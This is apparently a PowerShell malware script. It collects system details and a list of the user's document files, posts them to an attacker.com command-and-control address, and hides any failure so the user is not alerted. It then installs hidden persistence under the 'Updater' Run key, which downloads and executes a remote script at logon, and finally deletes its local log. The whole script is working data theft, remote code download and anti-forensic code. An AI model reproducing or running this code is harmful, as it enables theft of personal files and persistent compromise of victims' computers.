# --- Phase 1: Environment Recon ---
$User = $env:USERNAME
$Computer = $env:COMPUTERNAME
$IP = (Get-NetIPAddress -AddressFamily IPv4).IPAddress[0]
$OS = [System.Environment]::OSVersion.VersionString

# --- Phase 2: Targeted Data Collection ---
# Targets potential credential stores or sensitive documents
$TargetDir = "$env:USERPROFILE\Documents"
$ExfilPath = "$env:TEMP\system_check.txt"

$LogHeader = @"
--- Recon Report ---
User: $User
Host: $Computer
IP:   $IP
OS:   $OS
--------------------
"@
$LogHeader | Out-File -FilePath $ExfilPath

# List files in Documents to identify high-value targets
Get-ChildItem -Path $TargetDir -Recurse -Include *.pdf,*.docx,*.xlsx | 
Select-Object FullName | Out-File -Append -FilePath $ExfilPath

# --- Phase 3: Exfiltration ---
# Simulates sending the data to the attacker's Command & Control (C2) server
try {
    Invoke-WebRequest -Uri "http://attacker.com/collect?data=$( $Computer )" `
                      -Method Post `
                      -InFile $ExfilPath `
                      -ErrorAction SilentlyContinue
} catch {
    # Fail silently to avoid alerting the user
}

Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Updater" -Value 'powershell.exe -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString(''http://attacker.com/update1.ps1'')"'

# --- Phase 4: Self-Cleanup ---
# Removes traces of the local log file
Remove-Item -Path $ExfilPath -Force